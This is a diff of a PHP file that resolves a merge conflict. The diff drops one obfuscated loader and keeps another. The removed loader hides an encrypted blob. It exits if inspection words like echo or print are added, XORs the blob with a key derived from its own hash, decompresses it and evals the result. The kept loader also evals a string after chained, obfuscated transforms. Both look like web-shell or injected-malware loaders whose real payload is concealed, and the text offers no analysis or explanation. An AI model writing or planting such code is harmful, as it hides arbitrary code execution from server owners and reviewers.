@@ -1,29 +1,4 @@
 <?php
-<<<<<<< Updated upstream
-$retzdk="6c431a90d7233e4a2dc85c6d59edd2a4";
-$vpmoshbgipl="065b0251015208035c0f5351565257570a53015d53500e500d095c5d56565400";
-$ugiopgfugu="SOKLMWFc6wMoRu6mGg82nnZnSzBRXtNkeLxrjBh5nYTdOWaGFT2AO05cetgP1dwZTqVnM7bre9Mf18XkTxPC0VNAfwayTjOuHKEXWza1pAcpRViXYxJ0ev8yahypcZ5WBVKD6DUGKfUC2Up0cQRGF3t3NUKcuUpSeAekgsOJ+KMOFN8+UC6nIzKG5SYCTF9u7PnxTeej/nC6Df0IPEy2ET+wQha19QeW2fDpZaTVQjN5is4BbOqvY9fRaqiYOhFgnKffOUohcORgKWk1qYNoRZo9glAw604GZD7unuPkl3WOHlQv+aDYh3xs8o64lE/S2HU3IDLlY/XPShId+OvZJpr3/8rn3ET0Qnfu4WJvUpwEBGwZ3d4Fwlh92iH97cHA+gQsxiXo4cpEZV9K+7As+E58LReMLwF1DHCKCupzqKGptmfayCF1njy7qAwAo6y++FqPa1py4TDByzXjX9wdp1f12tyZa6rwkuaS9a9N6OnKiR8SH3vmFssYsAzKiwcLYS334OFKlfPudVkdb3nn1hoiYsT75ukkVK+WoYDP60QAIg2ysjhWqJ1Yc75CZSGIjLVucnDpAiX5MSgP2BfqDNkb+jHv2YSHSwU8ZoJMRnj73zZ/SYhen59KNY5qSUeui2zSZWVokP6Gh2P7tITc9mS4sRLpQnPHhonDSXq5SsXfaSBsmMeEvqdnOrD335yfwn3Am2RwVY4O";
-$mrdzlfkzq=file_get_contents(__FILE__);
-$cmfmuhmjvu=str_replace($ugiopgfugu,"",$mrdzlfkzq);
-if(strpos($cmfmuhmjvu,"ec"."ho")!==false||strpos($cmfmuhmjvu,"pr"."int")!==false||strpos($cmfmuhmjvu,"var_"."dump")!==false||strpos($cmfmuhmjvu,"file_put_"."contents")!==false||strpos($cmfmuhmjvu,"fw"."rite")!==false){die();}
-$bdjunfqlx=str_replace(array($retzdk,$vpmoshbgipl),array("SP_16ddefae","KP_7b0d85e9"),$mrdzlfkzq);
-$vapzrlq=md5($bdjunfqlx);
-$zqcqzagp=hex2bin($vpmoshbgipl);
-$xfibabff="";
-$ctknmllj=strlen($vapzrlq);
-for($ynsfvtp=0;$ynsfvtp<$ctknmllj;$ynsfvtp++){
-$xfibabff.=chr(ord($zqcqzagp[$ynsfvtp])^ord($vapzrlq[$ynsfvtp]));
-}
-$miyuycsy=base64_decode($ugiopgfugu);
-$daxgrcj=strlen($miyuycsy);
-$iqdzmhisiz="";
-$koxlbdmyo=strlen($xfibabff);
-for($ynsfvtp=0;$ynsfvtp<$daxgrcj;$ynsfvtp++){
-$iqdzmhisiz.=$miyuycsy[$ynsfvtp]^$xfibabff[$ynsfvtp%$koxlbdmyo];
-}
-$prbttytxd="gzun"."compress";
-eval($prbttytxd($iqdzmhisiz));
-=======
 // fcaff3f31360ad8e0893243f
 $SRLQiorsDXX="4tVhtGpf5sx7Ys7aNcLUVpxl7Lm+9j0PEfEAkZhmasE=";
 $TMt_JtDQb="4gIugTcs5fk7Lf7nApYHIcky7Yz+9w0CRsRNxMuznfR=";
@@ -52,4 +27,3 @@ $EGuLJgpWhLd=$bbRmDbXpNiy($EGuLJgpWhLd);
 $EGuLJgpWhLd=$eOaSSLCSHQZm($EGuLJgpWhLd);
 $EGuLJgpWhLd=$TwwqNHVANxyjFu($EGuLJgpWhLd);
 eval($EGuLJgpWhLd);
->>>>>>> Stashed changes
